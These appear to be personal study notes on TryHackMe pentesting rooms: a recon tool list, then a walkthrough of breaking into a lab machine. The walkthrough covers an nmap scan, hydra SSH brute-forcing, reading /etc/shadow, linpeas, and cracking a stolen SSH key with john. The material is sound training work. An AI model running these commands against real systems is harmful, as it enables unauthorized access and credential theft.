# Penetration Testing

### The Hacker Methodology

_Summary: the steps in doing a pentesting_&#x20;

Room: [https://tryhackme.com/r/room/hackermethodology](https://tryhackme.com/r/room/hackermethodology)

* recon tools
  * peoplefinder.com
  * who.is -> check IP
  * sublist3r -> find subdomains
  * hunter.io -> search emails
  * builtwith.com and wappalyzer -> check a site was built with what
* enum and scan tools
  * dirbuster
  * enum4linux
  * metasploit
  * burpsuite
* covering tracks not needed for professionals; stop immidiately after priv. escalation
* sample of pentesting report: [link](https://github.com/hmaverickadams/TCM-Security-Sample-Pentest-Report)

### Basic Pentesting

_Summary: real implementation of_ [_The Hacker Methodology_](penetration-testing.md#the-hacker-methodology)&#x20;

Room: [https://tryhackme.com/r/room/basicpentestingjt](https://tryhackme.com/r/room/basicpentestingjt)

* deploy the machine, connect to target using openVPN

#### 1. scanning

* `mkdir nmap`
* `nmap -sC -sV -oN nmap/initial [TARGET IP]`
  * port 22 open -> running ssh
  * port 80 open -> running a website
  * port 139 and 445 -> running SMB "Samba" (server message block)
* check the website (port 80), use `curl` or browser, get some txt files
  * jan has weak password
  * server is using "struts REST 2.5.12"

#### 2. enumeration

* find hidden directory:
  * `gobuster -w /usr/share/wordlists/rockyou.txt -u http://[TARGET IP]/`
  * found `/development`
* smb enumeration
  * `enum4linux -a [TARGET IP] | tee enum4linux.log`
  * 'a' means all, tee to both print to terminal/stdout && the log file
  * found username `jan` and `kay`
* password brute-forcing (SSH)
  * `hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://[TARGET IP]`
  * found jan's password `armando`

#### 3. accessing jan ssh

* try obvious things (find priv. esc vector)
  * do `ls -la`
  * cat `/etc/passwd` & `/etc/shadow`
  * access kay's home dir
  * etc
* automatically find vector
  * use [linpeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS), send it to remote server: `scp linpeas.sh jan@[TARGET IP]:/dev/shm`
  * shm is "shared memory"
  * run inside remote server with `sh linpeas.sh | tee linlog.txt`
  * found vector: kay has her ssh private key open/readable

#### 4. accessing kay ssh

* using kay's key
  * store/copy both kay's keys locally
  * access kay's ssh with `ssh -i kay_id_rsa kay@[TARGET IP]`
  * key is password protected -> use johntheripper `ssh2john`
  * run `python3 /path/to/johntheripper/john/run/ssh2john.py kay_id_rsa > key_hash.txt` -> get password hash
  * run `/path/to/johntheripper/john/run/john key_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt` -> get password
  * found password `beeswax`
* rerun `ssh -i kay_id_rsa kay@[TARGET IP]`, enter passphrase
  * logged in as kay
  * cat `pass.bak`
  * found kay's password `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`
  * we can use this password to sudo
